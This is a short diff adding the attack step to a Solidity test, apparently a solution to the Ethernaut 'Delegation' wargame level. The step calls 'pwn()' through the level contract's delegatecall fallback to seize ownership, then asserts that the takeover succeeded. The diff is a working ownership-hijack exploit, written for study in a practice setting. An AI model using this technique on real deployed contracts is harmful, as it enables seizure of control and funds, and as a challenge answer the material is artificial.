@@ -29,6 +29,13 @@ contract DelegationTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
+        bytes4 pwnSelector = bytes4(keccak256("pwn()"));
+        bytes memory encodedPwnSelector = abi.encodePacked(pwnSelector);
+        (bool success, ) = levelAddress.call(encodedPwnSelector);
+
+        assertTrue(success, "Fallback didn't execute");
+        assertEq(ethernautDelegation.owner(), tx.origin, "Wrong owner");
+
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
